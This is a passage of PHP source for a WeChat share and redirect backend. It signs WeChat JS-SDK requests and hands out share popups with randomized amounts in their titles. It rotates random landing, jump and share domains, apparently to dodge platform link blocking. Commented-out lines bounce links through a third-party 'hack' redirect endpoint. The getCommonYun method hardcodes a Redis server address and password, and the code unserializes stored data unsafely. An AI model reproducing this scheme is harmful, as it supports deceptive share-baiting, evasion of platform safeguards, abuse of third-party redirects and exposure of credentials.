                    ['data'=>'','name'=>'弹窗','type'=>2],
                    ['data'=>'a','desc'=>$desc_d,'img'=>$img_d,'link'=>$urls[3],'share'=>1,'share_type'=>1,'title'=>$title_d,'type'=>1,'value'=>'b'],
                    ['data'=>'','name'=>'弹窗','type'=>2],
                    ['data'=>'a','desc'=>$desc_e,'img'=>$img_e,'link'=>$urls[4],'share'=>1,'share_type'=>1,'title'=>$title_e,'type'=>1,'value'=>'b'],
                    ['data'=>'','name'=>'弹窗','type'=>2],
                    ['data'=>'a','desc'=>$desc_f,'img'=>$img_f,'link'=>$urls[5],'share'=>2,'share_type'=>1,'title'=>$title_f,'type'=>1,'value'=>'b'],
                    ['data'=>'','name'=>'弹窗','type'=>2],
                    ['data'=>'a','desc'=>$desc_g,'img'=>$img_g,'link'=>$urls[6],'share'=>2,'share_type'=>1,'title'=>$title_g,'type'=>1,'value'=>'b'],
                    ['data'=>'','name'=>'弹窗','type'=>2],
                    ['data'=>'b','desc'=>$desc_g,'img'=>$img_g,'link'=>$urls[6],'share'=>2,'share_type'=>2,'title'=>$title_g,'type'=>1,'value'=>'b']
                ];
            }else{
                $data_a = $this->TPUN_serialize($this->redis->get('gxfc_share_set_hb:'.$share_set_id.':a'));
                $data_b = $this->TPUN_serialize($this->redis->get('gxfc_share_set_hb:'.$share_set_id.':b'));
                $data_c = $this->TPUN_serialize($this->redis->get('gxfc_share_set_hb:'.$share_set_id.':c'));

                $title_a = $data_a['a_title']??'';
                $title_b = $data_b['b_title']??'';
                $title_c = $data_c['c_title']??'';

                $desc_a = $data_a['a_desc']??'';
                $desc_b = $data_b['b_desc']??'';
                $desc_c = $data_c['c_desc']??'';

                $img_a =  $data_a['a_img'];
                $img_b =  $data_b['b_img'];
                $img_c =  $data_c['c_img'];

                $randomFloat = $this->randomFloat(100,200);
                $title_a = str_replace("{x}",$randomFloat,$title_a);
                $title_b = str_replace("{x}",$randomFloat,$title_b);
                $title_c = str_replace("{x}",$randomFloat,$title_c);
                $tip = [
                    ['data'=>'','name'=>'弹窗','type'=>2],
                    ['data'=>'b','desc'=>'','img'=>$img_a,'link'=>$urls[0],'share'=>2,'share_type'=>1,'title'=>$title_a,'type'=>1,'value'=>'b'],
                    ['data'=>'','name'=>'弹窗','type'=>2],
                    ['data'=>'a','desc'=>'','img'=>$img_b,'link'=>$urls[1],'share'=>2,'share_type'=>1,'title'=>$title_b,'type'=>1,'value'=>'b'],
                    ['data'=>'','name'=>'弹窗','type'=>2],
                    ['data'=>'a','desc'=>'','img'=>$img_c,'link'=>$urls[1],'share'=>2,'share_type'=>1,'title'=>$title_c,'type'=>1,'value'=>'b'],
                    ['data'=>'','name'=>'弹窗','type'=>2],
                    ['data'=>'b','desc'=>'','img'=>$img_c,'link'=>$urls[1],'share'=>2,'share_type'=>1,'title'=>$title_c,'type'=>1,'value'=>'b'],
                ];
            }

            $open_db["verify_ticket"] = json_decode($open_db["verify_ticket"],true);
            $sign = $this->getTicket($open_db);
            $config = [
                'iswechat' => 1, //调试开关
                'error' => 'http://www.chaicp.com',//错误页面
                'isdown' => 1, //禁止分享开关
                'sign' =>  $sign,
                'share' => $tip
            ];
            echo json_encode($config);exit;
        }
        if($this->m == 'ticket'){ //获取票据
            $this->dbinit();
            $this->referer_url = $_SERVER['HTTP_REFERER'];
            preg_match("/([\w\d-]+\.(com.cn|mo.cn|com|cn|net|vip|top|uicp.io|vicp.io))/",$this->referer_url,$m);
            $open_db = $this->select("select o.*,a.appid as a_appid,a.authorizer_refresh_token,a.id as aid from wx_open_plats as o join wx_gh as a on a.open_plats_id = o.id where a.status=1 and o.share_domain like :b",[":b"=>"%".$m[0]."%"]);

            if(empty($open_db)){
                $open_db = $this->select("select o.*,a.appid as a_appid,a.authorizer_refresh_token,a.id as aid from wx_open_plats as o join wx_gh as a on a.open_plats_id = o.id where a.status=1 and o.share_domain ='' limit 1");

            }

            $open_db["verify_ticket"] = json_decode($open_db["verify_ticket"],true);
            $sign = $this->getTicket($open_db);

            echo json_encode(['sign'=>$sign]);exit;

        }
        if($this->m == 'ad'){
            $dairen = $this->redis->get("gxfc_dairen");
            if(empty($dairen)){
                $ad_domain = $this->redis->get('gxfc_config/site');
                $ad_domain = unserialize(substr($ad_domain,16))['AD_DOMAIN'];
                $result =file_get_contents($ad_domain."&t=".time());
            }elseif($dairen == 's'){
                $luodi_map = $this->TPUN_serialize($this->redis->get("gxfc_landing_domain"));
                $k = array_rand($luodi_map);
                $domain = $luodi_map[$k];
                $luodi_url = str_replace("{domain}",$this->FormatDomain($domain),$this->format_url["luodi"]);
                $rndStr = $this->createNoncestr(10);
                $luodi_url = str_replace("{str|32}",$rndStr, $luodi_url );
                $rndStr = $this->createNoncestr(7);
                $luodi_url = str_replace("{str|7}",$rndStr, $luodi_url );
                //$luodi_url = "http://changyan.sohu.com/api/oauth2/nobody/hack?lkhkawso=bziwlxfjvpbfuqo&to_url=".$luodi_url;
                $result = json_encode(['n'=> $luodi_url]);
            }else{
                $url = "http://".$this->FormatDomain($dairen)."/hb2/Hb.php?m=dairenjs";
                $result =file_get_contents($url);
            }
            $this->back_info = $result;
            echo $this->back_info;
        }

        if($this->m=="luodi404"){
            $luodi_map = $this->TPUN_serialize($this->redis->get("gxfc_landing_domain"));
            //随机取一条
            $k = array_rand($luodi_map);
            $domain = $luodi_map[$k];
            $luodi_url = str_replace("{domain}",$this->FormatDomain($domain),$this->format_url["luodi"]);
            $rndStr = $this->createNoncestr(32);
            $predStr = $this->createNoncestr(6);
            $luodi_url = str_replace("{str|32}",$rndStr, $luodi_url );
            //$luodi_url = "http://changyan.sohu.com/api/oauth2/nobody/hack?lkhkawso=bziwlxfjvpbfuqo&to_url=".$luodi_url;
            $luodi_url = str_replace("{str|7}",$predStr, $luodi_url );
            echo $luodi_url;exit;
        }

        if($this->m=="tiaozhuan"){
            $tiaozhuan = $this->TPUN_serialize($this->redis->get("gxfc_jump_domain"));
            //随机取一条
            $k = array_rand($tiaozhuan);
            $domain = $tiaozhuan[$k];
            $tiaozhuan_url = str_replace("{domain}",$this->FormatDomain($domain),$this->format_url["tiaozhuan"]);
            $rndStr = $this->createNoncestr(32);
            $predStr = $this->createNoncestr(6);
            $tiaozhuan_url = str_replace("{str|32}",$rndStr, $tiaozhuan_url );
            $tiaozhuan_url = str_replace("{str|7}",$predStr, $tiaozhuan_url );
            echo $tiaozhuan_url;exit;
        }

        //带人
        if($this->m=="dairenjs"){
            $luodi_map = $this->TPUN_serialize($this->redis->get("gxfc_landing_domain"));

            //随机取一条
            $k = array_rand($luodi_map);
            $domain = $luodi_map[$k];
            $luodi_url = str_replace("{domain}",$this->FormatDomain($domain),$this->format_url["luodi"]);
            $rndStr = $this->createNoncestr(32);
            $preStr = $this->createNoncestr(8);
            $luodi_url = str_replace("{str|32}",$rndStr, $luodi_url );
            $luodi_url = str_replace("{str|7}",$preStr, $luodi_url );
            echo json_encode(['n'=>$luodi_url]);exit;
        }

    }
    public function getCommonYun()
    {
        $name = 'gxfc_yun_domain_share';//云分享
        $redis= new Redis();
        $redis->connect('159.138.131.106','6379');
        $redis->auth('Mars521xiaoxue');

        $list = $this->TPUN_serialize($redis->get($name));
        if (empty($list)){
            $this->redisinit();
            $list = $this->TPUN_serialize($this->redis->get($name));
        }

        return $list;
    }
    public function getShareUrl()
    {
        $share_url = $this->TPUN_serialize($this->redis->get("gxfc_share_domain"));
        $share_type = $this->redis->get("gxfc_fenxiang_hb_type");

        if(!empty($share_url)){
            if(is_array($share_url)){
                $k = array_rand($share_url);
                $domain = $share_url[$k];
            }else{
                $domain = $share_url;
            }
        }

        if (empty($domain)){
            /*
             $yun_domain = $this->TPUN_serialize($this->redis->get("gxfc_yun_domain"));
              if(!empty($yun_domain)){
                  $k = array_rand($yun_domain);
                  $domain = $yun_domain[$k];
                  $share_url = str_replace("{domain}",$this->FormatDomain($domain),$this->format_url["yun_share"]);
              }
              */

            $yun_domain_share = $this->getCommonYun();

            if(!empty($yun_domain_share)){
                $k = array_rand($yun_domain_share);
                $domain = $yun_domain_share[$k];
                if($share_type == 1){
                    $share_url = str_replace("{domain}",$this->FormatDomain($domain),$this->format_url["yun_share_domain_qun"]);

                }else{
                    $share_url = str_replace("{domain}",$this->FormatDomain($domain),$this->format_url["yun_share_domain"]);

                }
                $rndStr = $this->createNoncestr(7);
                $share_url = str_replace("{str|7}",$rndStr, $share_url);
            }
        }else{
            if($share_type == 1){
                //随机取一条
                $share_url = str_replace("{domain}",$this->FormatDomain($domain),$this->format_url["fenxiang"]);
            }else{
                //随机取一条
                $share_url = str_replace("{domain}",$this->FormatDomain($domain),$this->format_url["fenxiang1"]);
            }
            $rndStr = $this->createNoncestr(18);
            $share_url = str_replace("{str|18}",$rndStr, $share_url);
            $rndStr = $this->createNoncestr(7);
            $share_url = str_replace("{str|7}",$rndStr, $share_url);
        }
        return $share_url;
    }
    public function getYunAd()
    {
        $list = $this->TPUN_serialize($this->redis->get('gxfc_yun_domain_ad'));
        $domain = null;
        if (!empty($list)){
            $k = array_rand($list);
            $domain = $list[$k];
        }
        return $domain;
    }
    //格式化tp的redis
    public function TPUN_serialize($str="")
    {
        $l = str_replace("think_serialize:","",$str);
        return unserialize($l);
    }
    //格式化域名，去掉https http
    public function FormatDomain($url="")
    {
        return str_replace(["http://","https://"],"",$url);
    }

    /**
     * 解析url中参数信息，返回参数数组
     */
    function convertUrlQuery($query)
    {
        $queryParts = explode('&', $query);

        $params = array();
        foreach ($queryParts as $param) {
            $item = explode('=', $param);
            $params[$item[0]] = $item[1];
        }

        return $params;
    }

    //数据库初始化
    public function dbinit()
    {
        $this->private_conn = new PDO('mysql:host='.$this->dbconfig[0].';dbname='.$this->dbconfig[3].';port=3306;charset=utf8',$this->dbconfig[1],$this->dbconfig[2]);
    }
    // 查询
    public function select($sql,$attributes=array())
    {
        $stmt = $this->private_conn->prepare($sql);foreach ($attributes as $key => $value) {$stmt->bindValue($key,$value);}$st = $stmt->execute();if ($st) {$rows = $stmt->fetchAll();return count($rows)==1?$rows[0]:$rows;}else{return false;}}
    // 执行
    public function exec($sql,$attributes=array()){
        $stmt = $this->private_conn->prepare($sql);foreach ($attributes as $key => $value) {$stmt->bindValue($key,$value);}$st = $stmt->execute();if ($st) {return $stmt->rowCount();}else{return false;}
    }
    //reids初始化
    public function redisinit()
    {
        $this->redis = new Redis();
        $this->redis->connect($this->redisconfig[0],$this->redisconfig[1]);
        $this->redis->auth($this->redisconfig[2]);
    }
    //公众平台获取参数 开始
//    *************************************************************************************************************
//    *************************************************************************************************************
//    *************************************************************************************************************
    public function createNoncestr($length = 32, $str = "")
    {
        $chars = "abcdefghijklmnopqrsuvwxyz0123456789";
        for ($i = 0; $i < $length; $i++) {
            $str .= substr($chars, mt_rand(0, strlen($chars) - 1), 1);
        }
        return $str;
    }
    public function getTicket($mp)
    {
        // $cache_name = $mp["a_appid"]."_ticket_jsapi";
        $cache_name = $mp["a_appid"]."_ticket_jsapi".$mp["id"];
        $ticket = $this->redis->get($cache_name);
        $authorizer_refresh_token_name = $mp["a_appid"].'_access_token_'.$mp['appid'];
        $authorizer_refresh_token = $this->redis->get($authorizer_refresh_token_name);
        if (empty($ticket)  ||empty($authorizer_refresh_token) ) {
            //1：强制获取component_access_token
            $component_access_token_name = 'wechat_component_access_token_'.$mp['appid'];
            if($this->redis->ttl($component_access_token_name) == - 2){
                $url = "https://api.weixin.qq.com/cgi-bin/component/api_component_token";
                $post_param = ["component_appid"=>$mp["appid"],"component_appsecret"=>$mp["appsecret"],"component_verify_ticket"=>$mp["verify_ticket"]["jsapi_ticket"]];
                $b = json_decode($this->request_post($url,json_encode($post_param)),true);
                $component_access_token = $b["component_access_token"];
                $this->redis->setex($component_access_token_name,7000,$component_access_token);

            }else{

                $component_access_token = $this->redis->get($component_access_token_name);
            }

            //2:获取authorizer_refresh_token
            $authorizer_refresh_token_name = $mp["a_appid"].'_access_token_'.$mp['appid'];
            if($this->redis->ttl($authorizer_refresh_token_name) == - 2){
                $url = "https://api.weixin.qq.com/cgi-bin/component/api_authorizer_token?component_access_token=".$component_access_token;
                $post_param = ["component_appid"=>$mp["appid"],"authorizer_appid"=>$mp["a_appid"],"authorizer_refresh_token"=>$mp["authorizer_refresh_token"]];
                $b = json_decode($this->request_post($url,json_encode($post_param)),true);
                $this->exec("update wx_gh set authorizer_refresh_token=:a where id=:b",[":a"=>$b["authorizer_refresh_token"],":b"=>$mp["aid"]]);
                $authorizer_access_token = $b["authorizer_access_token"];
                $this->redis->setex($authorizer_refresh_token_name,7000,$authorizer_access_token);
                if(empty($authorizer_access_token)){$this->redis->set($authorizer_refresh_token_name.'_debug',json_encode($b));}

            }else{
                $authorizer_access_token = $this->redis->get($authorizer_refresh_token_name);

            }
            //3:获取jsticket
            $url = "https://api.weixin.qq.com/cgi-bin/ticket/getticket?access_token=".$authorizer_access_token."&type=jsapi";
            $b = json_decode($this->request_post($url),true);
            $ticket = $b["ticket"];
            if(empty($ticket)){$this->redis->set($cache_name.'_debug',json_encode($b));}
            $this->redis->setex($cache_name,3600,$ticket);
            $this->redis->setex($mp["a_appid"]."_ticket_jsapi",3600,$ticket);

        }
        $data = ["url" => $this->referer_url, "timestamp" => ''.time(), "jsapi_ticket" => $ticket, "noncestr" => $this->createNoncestr(16)];
        return [
            'debug'     => false,
            "appId"     => $mp["a_appid"],
            "nonceStr"  => $data['noncestr'],
            "timestamp" => $data['timestamp'],
            "signature" => $this->getSignature($data, 'sha1'),
            'jsApiList' => [
                'updateAppMessageShareData', 'updateTimelineShareData', 'onMenuShareTimeline', 'onMenuShareAppMessage', 'onMenuShareQQ', 'onMenuShareWeibo', 'onMenuShareQZone',
                'startRecord', 'stopRecord', 'onVoiceRecordEnd', 'playVoice', 'pauseVoice', 'stopVoice', 'onVoicePlayEnd', 'uploadVoice', 'downloadVoice',
                'chooseImage', 'previewImage', 'uploadImage', 'downloadImage', 'translateVoice', 'getNetworkType', 'openLocation', 'getLocation',
                'hideOptionMenu', 'showOptionMenu', 'hideMenuItems', 'showMenuItems', 'hideAllNonBaseMenuItem', 'showAllNonBaseMenuItem',
                'closeWindow', 'scanQRCode', 'chooseWXPay', 'openProductSpecificView', 'addCard', 'chooseCard', 'openCard',
            ],
        ];
    }
    /**
     * 数据生成签名
     * @param array $data 签名数组
     * @param string $method 签名方法
     * @param array $params 签名参数
     * @return bool|string 签名值
     */
    protected function getSignature($data, $method = "sha1", $params = [])
    {
        ksort($data);
        if (!function_exists($method)) return false;
        foreach ($data as $k => $v) array_push($params, "{$k}={$v}");
        return $method(join('&', $params));
    }
    /**
     * 模拟post进行url请求
     * @param string $url
     * @param string $param
     */
    public function request_post($url = '', $param = '') {
        if (empty($url)) {
            return false;
        }

        $postUrl = $url;
        $curlPost = $param;
        $ch = curl_init();//初始化curl
        curl_setopt($ch, CURLOPT_URL,$postUrl);//抓取指定网页
        curl_setopt($ch, CURLOPT_HEADER, 0);//设置header
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);//要求结果为字符串且输出到屏幕上
        if (!empty($param)) {
            curl_setopt($ch, CURLOPT_POST, 1);//post提交方式
            curl_setopt($ch, CURLOPT_POSTFIELDS, $curlPost);
        }
        $data = curl_exec($ch);//运行curl
        curl_close($ch);

        return $data;
    }

    //生成随机数
    public function randomFloat($min = 0, $max = 1) {
        $num = $min + mt_rand() / mt_getrandmax() * ($max - $min);
        return sprintf("%.2f",$num);  //控制小数后几位
    }
//    *************************************************************************************************************
//    *************************************************************************************************************
//    *************************************************************************************************************
//    *************************************************************************************************************
}
$m = isset($_REQUEST["m"])?$_REQUEST["m"]:"default";
if($m!=="default"){
    $t = new Hb();
    $t->m = $m;
    $t->Init()->RunMain();
}
